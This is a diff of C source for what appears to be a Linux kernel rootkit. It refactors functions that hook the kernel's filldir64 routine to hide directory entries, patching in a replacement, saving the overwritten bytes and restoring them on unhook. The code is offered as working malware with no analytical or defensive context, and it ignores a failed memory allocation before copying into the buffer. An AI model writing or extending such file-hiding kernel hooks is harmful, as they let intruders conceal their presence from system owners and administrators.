@@ -86,34 +86,36 @@ efault:
 	return -EFAULT;
 }
 
-static struct view hook_filldir64_restore = {0};
+static struct view filldir64_restore = {0};
 
 void hide_set_filldir64(void) {
+	struct view restore;
+
 	// only set if not previously set
-	if (hook_filldir64_restore.ptr != NULL)
+	if (filldir64_restore.ptr != NULL)
 		return;
 	
-	hook_set((void *)filldir64, &filldir64_hook);
+	restore = hook_set((void *)filldir64, &filldir64_hook);
 
-	hook_filldir64_restore.ptr = kmalloc(hook_last_replaced_sz, GFP_KERNEL);
-	if (!hook_filldir64_restore.ptr) {
+	filldir64_restore.ptr = kmalloc(restore.size, GFP_KERNEL);
+	if (!filldir64_restore.ptr) {
 		/* well */
 	}
 
-	memcpy(hook_filldir64_restore.ptr, hook_last_replaced, hook_last_replaced_sz);
+	filldir64_restore.size = restore.size;
 
-	hook_filldir64_restore.size = hook_last_replaced_sz;
+	memcpy(filldir64_restore.ptr, restore.ptr, restore.size);
 }
 
 void hide_unset_filldir64(void) {
 	// only unset if previously set
-	if (hook_filldir64_restore.ptr == NULL)
+	if (filldir64_restore.ptr == NULL)
 		return;
 	
-	hook_unset((void *)filldir64, hook_filldir64_restore.ptr, hook_filldir64_restore.size);
-	kfree(hook_filldir64_restore.ptr);
+	hook_unset((void *)filldir64, filldir64_restore);
+	kfree(filldir64_restore.ptr);
 	
 	// reset view so on next hook_set kmalloc will be called
-	hook_filldir64_restore.ptr = 0;
-	hook_filldir64_restore.size = 0;
+	filldir64_restore.ptr = 0;
+	filldir64_restore.size = 0;
 }
